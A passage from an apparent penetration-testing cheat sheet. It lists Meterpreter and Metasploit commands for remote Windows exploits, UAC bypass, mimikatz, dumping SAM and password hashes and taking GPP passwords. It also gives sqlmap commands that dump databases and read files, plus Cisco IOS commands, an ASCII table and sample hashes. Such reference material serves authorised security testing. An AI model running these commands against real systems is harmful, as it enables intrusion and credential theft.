            <p>Meterpreter download file from Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>download c:\\windows\\repair\\sam /tmp</code></p>
      </td>
      <td>
            <p>Meterpreter download file from Windows target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>execute -f c:\\windows\temp\exploit.exe</code></p>
      </td>
      <td>
            <p>Meterpreter run .exe on target - handy for executing uploaded exploits</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>execute -f cmd -c </code></p>
      </td>
      <td>
            <p>Creates new channel with cmd shell</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>ps</code></p>
      </td>
      <td>
        <p>Meterpreter show processes</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>shell</code></p>
      </td>
      <td>
        <p>Meterpreter get shell on the target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>getsystem</code></p>
      </td>
      <td>
        <p>Meterpreter attempts priviledge escalation the target</p>
      </td>
    </tr>    
    <tr>
      <td>
        <p><code>hashdump</code></p>
      </td>
      <td>
        <p>Meterpreter attempts to dump the hashes on the target</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>portfwd add –l 3389 –p 3389 –r target</code></p>
      </td>
      <td>
        <p>Meterpreter create port forward to target machine</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>portfwd delete –l 3389 –p 3389 –r target</code></p>
      </td>
      <td>
        <p>Meterpreter delete port forward</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h2 id="common-metasploit-modules">
Common Metasploit Modules
</h2>
<p>
Top metasploit modules.
</p>
<h3 id="remote-windows-metasploit-modules-exploits">
Remote Windows Metasploit Modules (exploits)
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}use exploit/windows/smb/ms08_067_netapi`</code>`{=html}
</p>
</td>
<td>
<p>
MS08_067 Windows 2k, XP, 2003 Remote Exploit
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use
exploit/windows/dcerpc/ms06_040_netapi`</code>`{=html}
</p>
</td>
<td>
<p>
MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use
exploit/windows/smb/`<br />`{=html}ms09_050_smb2_negotiate_func_index`</code>`{=html}
</p>
</td>
<td>
<p>
MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="local-windows-metasploit-modules-exploits">
Local Windows Metasploit Modules (exploits)
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}use exploit/windows/local/bypassuac`</code>`{=html}
</p>
</td>
<td>
<p>
Bypass UAC on Windows 7 + Set target + arch, x86/64
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="auxilary-metasploit-modules">
Auxilary Metasploit Modules
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tr>
<td>
<p>
`<code>`{=html}use auxiliary/scanner/http/dir_scanner`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit HTTP directory scanner
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use auxiliary/scanner/http/jboss_vulnscan`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit JBOSS vulnerability scanner
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use auxiliary/scanner/mssql/mssql_login`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit MSSQL Credential Scanner
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use auxiliary/scanner/mysql/mysql_version`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit MSSQL Version Scanner
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use auxiliary/scanner/oracle/oracle_login`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit Oracle Login Module
</p>
</td>
</tr>
</table>
:::

<h3 id="metasploit-powershell-modules">
Metasploit Powershell Modules
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}use exploit/multi/script/web_delivery`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit powershell payload delivery module
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}post/windows/manage/powershell/exec_powershell`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit upload and run powershell script through a session
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use exploit/multi/http/jboss_maindeployer`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit JBOSS deploy
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use exploit/windows/mssql/mssql_payload`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit MSSQL payload
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="post-exploit-windows-metasploit-modules">
Post Exploit Windows Metasploit Modules
</h3>
<p>
Windows Metasploit Modules for privilege escalation.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}run post/windows/gather/win_privs`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit show privileges of current user
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}use post/windows/gather/credentials/gpp`</code>`{=html}
</p>
</td>
<td>
<p>
Metasploit grab GPP saved passwords
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}load mimikatz -\> wdigest`</code>`{=html}
</p>
</td>
<td>
<p>
Metasplit load Mimikatz
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}run
post/windows/gather/local_admin_search_enum`</code>`{=html}
</p>
</td>
<td>
<p>
Idenitfy other machines that the supplied domain user has administrative
access to
</p>
</td>
</tr>

    <tr>
      <td>
        <p><code>run post/windows/gather/smart_hashdump</code></p>
      </td>
      <td>
        <p>Automated dumping of sam file, tries to esc privileges etc</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h2 id="ascii-table-cheat-sheet">
ASCII Table Cheat Sheet
</h2>
<p>
Useful for Web Application Penetration Testing, or if you get stranded
on Mars and need to communicate with NASA.
</p>

::::::::::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
ASCII
</th>
<th>
Character
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}x00`</code>`{=html}
</p>
</td>
<td>
<p>
Null Byte
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x08`</code>`{=html}
</p>
</td>
<td>
<p>
BS
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x09`</code>`{=html}
</p>
</td>
<td>
<p>
TAB
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x0a`</code>`{=html}
</p>
</td>
<td>
<p>
LF
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x0d`</code>`{=html}
</p>
</td>
<td>
<p>
CR
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x1b`</code>`{=html}
</p>
</td>
<td>
<p>
ESC
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x20`</code>`{=html}
</p>
</td>
<td>
<p>
SPC
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x21`</code>`{=html}
</p>
</td>
<td>
<p>
!
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x22`</code>`{=html}
</p>
</td>
<td>
<p>
"
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x23`</code>`{=html}
</p>
</td>
<td>
<p>
\#
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x24`</code>`{=html}
</p>
</td>
<td>
<p>
\$
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x25`</code>`{=html}
</p>
</td>
<td>
<p>
\%
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x26`</code>`{=html}
</p>
</td>
<td>
<p>
&
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x27`</code>`{=html}
</p>
</td>
<td>
<p>
\`
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x28`</code>`{=html}
</p>
</td>
<td>
<p>
(
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x29`</code>`{=html}
</p>
</td>
<td>
<p>
)
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x2a`</code>`{=html}
</p>
</td>
<td>
<p>
\*
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x2b`</code>`{=html}
</p>
</td>
<td>
<p>
\+
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x2c`</code>`{=html}
</p>
</td>
<td>
<p>
,
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x2d`</code>`{=html}
</p>
</td>
<td>
<p>
\-
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x2e`</code>`{=html}
</p>
</td>
<td>
<p>
.
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x2f`</code>`{=html}
</p>
</td>
<td>
<p>
/
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x30`</code>`{=html}
</p>
</td>
<td>
<p>
0
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x31`</code>`{=html}
</p>
</td>
<td>
<p>
1
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x32`</code>`{=html}
</p>
</td>
<td>
<p>
2
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x33`</code>`{=html}
</p>
</td>
<td>
<p>
3
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x34`</code>`{=html}
</p>
</td>
<td>
<p>
4
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x35`</code>`{=html}
</p>
</td>
<td>
<p>
5
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x36`</code>`{=html}
</p>
</td>
<td>
<p>
6
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x37`</code>`{=html}
</p>
</td>
<td>
<p>
7
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x38`</code>`{=html}
</p>
</td>
<td>
<p>
8
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x39`</code>`{=html}
</p>
</td>
<td>
<p>
9
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x3a`</code>`{=html}
</p>
</td>
<td>
<p>
:
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x3b`</code>`{=html}
</p>
</td>
<td>
<p>
;
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x3c`</code>`{=html}
</p>
</td>
<td>
<p>
\<
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x3d`</code>`{=html}
</p>
</td>
<td>
<p>
=
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x3e`</code>`{=html}
</p>
</td>
<td>
<p>
\>
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x3f`</code>`{=html}
</p>
</td>
<td>
<p>
?
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x40`</code>`{=html}
</p>
</td>
<td>
<p>
@
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x41`</code>`{=html}
</p>
</td>
<td>
<p>
A
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x42`</code>`{=html}
</p>
</td>
<td>
<p>
B
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x43`</code>`{=html}
</p>
</td>
<td>
<p>
C
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x44`</code>`{=html}
</p>
</td>
<td>
<p>
D
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x45`</code>`{=html}
</p>
</td>
<td>
<p>
E
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x46`</code>`{=html}
</p>
</td>
<td>
<p>
F
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x47`</code>`{=html}
</p>
</td>
<td>
<p>
G
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x48`</code>`{=html}
</p>
</td>
<td>
<p>
H
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x49`</code>`{=html}
</p>
</td>
<td>
<p>
I
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x4a`</code>`{=html}
</p>
</td>
<td>
<p>
J
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x4b`</code>`{=html}
</p>
</td>
<td>
<p>
K
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x4c`</code>`{=html}
</p>
</td>
<td>
<p>
L
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x4d`</code>`{=html}
</p>
</td>
<td>
<p>
M
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x4e`</code>`{=html}
</p>
</td>
<td>
<p>
N
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x4f`</code>`{=html}
</p>
</td>
<td>
<p>
O
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x50`</code>`{=html}
</p>
</td>
<td>
<p>
P
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x51`</code>`{=html}
</p>
</td>
<td>
<p>
Q
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x52`</code>`{=html}
</p>
</td>
<td>
<p>
R
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x53`</code>`{=html}
</p>
</td>
<td>
<p>
S
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x54`</code>`{=html}
</p>
</td>
<td>
<p>
T
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x55`</code>`{=html}
</p>
</td>
<td>
<p>
U
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x56`</code>`{=html}
</p>
</td>
<td>
<p>
V
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x57`</code>`{=html}
</p>
</td>
<td>
<p>
W
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x58`</code>`{=html}
</p>
</td>
<td>
<p>
X
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x59`</code>`{=html}
</p>
</td>
<td>
<p>
Y
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x5a`</code>`{=html}
</p>
</td>
<td>
<p>
Z
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x5b`</code>`{=html}
</p>
</td>
<td>
<p>
\[
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x5c`</code>`{=html}
</p>
</td>
<td>
<p>
\</p\>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x5d`</code>`{=html}
</p>
</td>
<td>
<p>
\]
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x5e`</code>`{=html}
</p>
</td>
<td>
<p>
\^
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x5f`</code>`{=html}
</p>
</td>
<td>
<p>
\_
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x60`</code>`{=html}
</p>
</td>
<td>
<p>
\`
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x61`</code>`{=html}
</p>
</td>
<td>
<p>
a
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x62`</code>`{=html}
</p>
</td>
<td>
<p>
b
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x63`</code>`{=html}
</p>
</td>
<td>
<p>
c
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x64`</code>`{=html}
</p>
</td>
<td>
<p>
d
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x65`</code>`{=html}
</p>
</td>
<td>
<p>
e
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x66`</code>`{=html}
</p>
</td>
<td>
<p>
f
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x67`</code>`{=html}
</p>
</td>
<td>
<p>
g
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x68`</code>`{=html}
</p>
</td>
<td>
<p>
h
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x69`</code>`{=html}
</p>
</td>
<td>
<p>
i
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x6a`</code>`{=html}
</p>
</td>
<td>
<p>
j
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x6b`</code>`{=html}
</p>
</td>
<td>
<p>
k
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x6c`</code>`{=html}
</p>
</td>
<td>
<p>
l
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x6d`</code>`{=html}
</p>
</td>
<td>
<p>
m
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x6e`</code>`{=html}
</p>
</td>
<td>
<p>
n
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x6f`</code>`{=html}
</p>
</td>
<td>
<p>
o
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x70`</code>`{=html}
</p>
</td>
<td>
<p>
p
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x71`</code>`{=html}
</p>
</td>
<td>
<p>
q
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x72`</code>`{=html}
</p>
</td>
<td>
<p>
r
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x73`</code>`{=html}
</p>
</td>
<td>
<p>
s
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x74`</code>`{=html}
</p>
</td>
<td>
<p>
t
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x75`</code>`{=html}
</p>
</td>
<td>
<p>
u
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x76`</code>`{=html}
</p>
</td>
<td>
<p>
v
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x77`</code>`{=html}
</p>
</td>
<td>
<p>
w
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x78`</code>`{=html}
</p>
</td>
<td>
<p>
x
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x79`</code>`{=html}
</p>
</td>
<td>
<p>
y
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}x7a`</code>`{=html}
</p>
</td>
<td>
<p>
z
</p>
</td>
</tr>
</tbody>
</table>
</div>
<h2 id="cisco-ios-commands">
CISCO IOS Commands
</h2>
<p>
A collection of useful Cisco IOS commands.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}enable`</code>`{=html}
</p>
</td>
<td>
<p>
Enters enable mode
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}conf t`</code>`{=html}
</p>
</td>
<td>
<p>
Short for, configure terminal
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}(config)# interface fa0/0`</code>`{=html}
</p>
</td>
<td>
<p>
Configure FastEthernet 0/0
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}(config-if)# ip addr 0.0.0.0
255.255.255.255`</code>`{=html}
</p>
</td>
<td>
<p>
Add ip to fa0/0
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}(config-if)# ip addr 0.0.0.0
255.255.255.255`</code>`{=html}
</p>
</td>
<td>
<p>
Add ip to fa0/0
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}(config-if)# line vty 0 4`</code>`{=html}
</p>
</td>
<td>
<p>
Configure vty line
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}(config-line)# login`</code>`{=html}
</p>
</td>
<td>
<p>
Cisco set telnet password
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}(config-line)# password YOUR-PASSWORD`</code>`{=html}
</p>
</td>
<td>
<p>
Set telnet password
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show running-config`</code>`{=html}
</p>
</td>
<td>
<p>
Show running config loaded in memory
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show startup-config`</code>`{=html}
</p>
</td>
<td>
<p>
Show sartup config
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show version`</code>`{=html}
</p>
</td>
<td>
<p>
show cisco IOS version
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show session`</code>`{=html}
</p>
</td>
<td>
<p>
display open sessions
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show ip interface`</code>`{=html}
</p>
</td>
<td>
<p>
Show network interfaces
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show interface e0`</code>`{=html}
</p>
</td>
<td>
<p>
Show detailed interface info
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show ip route`</code>`{=html}
</p>
</td>
<td>
<p>
Show routes
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# show access-lists`</code>`{=html}
</p>
</td>
<td>
<p>
Show access lists
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# dir file systems`</code>`{=html}
</p>
</td>
<td>
<p>
Show available files
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# dir all-filesystems`</code>`{=html}
</p>
</td>
<td>
<p>
File information
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# dir /all`</code>`{=html}
</p>
</td>
<td>
<p>
SHow deleted files
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# terminal length 0`</code>`{=html}
</p>
</td>
<td>
<p>
No limit on terminal output
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# copy running-config tftp`</code>`{=html}
</p>
</td>
<td>
<p>
Copys running config to tftp server
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}\# copy running-config startup-config`</code>`{=html}
</p>
</td>
<td>
<p>
Copy startup-config to running-config
</p>
</td>
</tr>
</tbody>
</table>
:::

<h2 id="cryptography">
Cryptography
</h2>
<h3 id="hash-lengths">
Hash Lengths
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Hash
</th>
<th>
Size
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
MD5 Hash Length
</p>
</td>
<td>
<p>
`<code>`{=html}16 Bytes`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-1 Hash Length
</p>
</td>
<td>
<p>
`<code>`{=html}20 Bytes`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-256 Hash Length
</p>
</td>
<td>
<p>
`<code>`{=html}32 Bytes`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-512 Hash Length
</p>
</td>
<td>
<p>
`<code>`{=html}64 Bytes`</code>`{=html}
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="hash-examples">
Hash Examples
</h3>
<p>
Likely just use `<strong>`{=html}hash-identifier`</strong>`{=html} for
this but here are some example hashes:
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Hash
</th>
<th>
Example
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
MD5 Hash Example
</p>
</td>
<td>
<p>
`<code>`{=html}8743b52063cd84097a65d1633f5c74f5`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
MD5 $PASS:$SALT Example
</p>
</td>
<td>
<p>
`<code>`{=html}01dfae6e5d4d90d9892622325959afbe:7050461`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
MD5 $SALT:$PASS
</p>
</td>
<td>
<p>
`<code>`{=html}f0fda58630310a6dd91a7d8f0a4ceda2:4225637426`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA1 Hash Example
</p>
</td>
<td>
<p>
`<code>`{=html}b89eaac7e61417341b710b727768294d0e6a277b`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA1 $PASS:$SALT
</p>
</td>
<td>
<p>
`<code>`{=html}2fc5a684737ce1bf7b3b239df432416e0dd07357:2014`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA1 $SALT:$PASS
</p>
</td>
<td>
<p>
`<code>`{=html}cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-256
</p>
</td>
<td>
<p>
`<code>`{=html}127e6fbfe24a750e72930c220a8e138275656b`<br />`{=html}8e5d8f48a98c3c92df2caba935`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-256 $PASS:$SALT
</p>
</td>
<td>
<p>
`<code>`{=html}c73d08de890479518ed60cf670d17faa26a4a7`<br />`{=html}1f995c1dcc978165399401a6c4`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-256 $SALT:$PASS
</p>
</td>
<td>
<p>
`<code>`{=html}eb368a2dfd38b405f014118c7d9747fcc97f4`<br />`{=html}f0ee75c05963cd9da6ee65ef498:560407001617`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-512
</p>
</td>
<td>
<p>
`<code>`{=html}82a9dda829eb7f8ffe9fbe49e45d47d2dad9`<br />`{=html}664fbb7adf72492e3c81ebd3e29134d9bc`<br />`{=html}12212bf83c6840f10e8246b9db54a4`<br />`{=html}859b7ccd0123d86e5872c1e5082f`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-512 $PASS:$SALT
</p>
</td>
<td>
<p>
`<code>`{=html}e5c3ede3e49fb86592fb03f471c35ba13e8`<br />`{=html}d89b8ab65142c9a8fdafb635fa2223c24e5`<br />`{=html}558fd9313e8995019dcbec1fb58414`<br />`{=html}6b7bb12685c7765fc8c0d51379fd`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
SHA-512 $SALT:$PASS
</p>
</td>
<td>
<p>
`<code>`{=html}976b451818634a1e2acba682da3fd6ef`<br />`{=html}a72adf8a7a08d7939550c244b237c72c7d4236754`<br />`{=html}4e826c0c83fe5c02f97c0373b6b1`<br />`{=html}386cc794bf0d21d2df01bb9c08a`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
NTLM Hash Example
</p>
</td>
<td>
<p>
`<code>`{=html}b4b9b02e6f09a9bd760f388b67351e2b`</code>`{=html}
</p>
</td>
</tr>
</tbody>
</table>
:::

<h2 id="sqlmap-examples">
SQLMap Examples
</h2>
<p>
A mini SQLMap cheat sheet, see our full
`<a href="/blog/sqlmap-cheat-sheet/">`{=html}SQLMap cheat
sheet`</a>`{=html} for more commaands:
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}sqlmap -u http://meh.com --forms --batch --crawl=10
`<br />`{=html} --cookie=jsessionid=54321 --level=5
--risk=3`</code>`{=html}
</p>
</td>
<td>
<p>
Automated sqlmap scan
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html} sqlmap -u TARGET -p PARAM --data=POSTDATA
--cookie=COOKIE `<br />`{=html} --level=3 --current-user --current-db
--passwords `<br />`{=html} --file-read="/var/www/blah.php"
`</code>`{=html}
</p>
</td>
<td>
<p>
Targeted sqlmap scan
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}sqlmap -u "http://meh.com/meh.php?id=1"
`<br />`{=html}--dbms=mysql --tech=U --random-agent --dump
`</code>`{=html}
</p>
</td>
<td>
<p>
Scan url for union + error based injection with mysql backend
`<br />`{=html}and use a random user agent + database dump
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}sqlmap -o -u "http://meh.com/form/"
--forms`</code>`{=html}
</p>
</td>
<td>
<p>
sqlmap check form for injection
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}sqlmap -o -u "http://meh/vuln-form" --forms
`<br />`{=html} -D database-name -T users --dump`</code>`{=html}
</p>
</td>
<td>
<p>
sqlmap dump and crack hashes for table users on database-name.
</p>
</td>
</tr>
</tbody>
</table>
:::

<h2 id="document-changelog">
Document Changelog
</h2>
<ul>
<li>
`<strong>`{=html}Last Updated:`</strong>`{=html} 20/05/2025 (20th of May
2025)
</li>
<li>
`<strong>`{=html}Author:`</strong>`{=html} Arr0way
</li>
<li>
`<strong>`{=html}Notes:`</strong>`{=html} Reviewed content is current
for various tools.
</li>
</ul>
<p>
Previous document changes:
</p>
<ul>
<li>
16/09/2020 - fixed some formatting issues.
</li>
<li>
17/02/2017 - Article updated, added loads more content, VPN, DNS
tunneling, VLAN hopping etc - check out the TOC below.
</li>
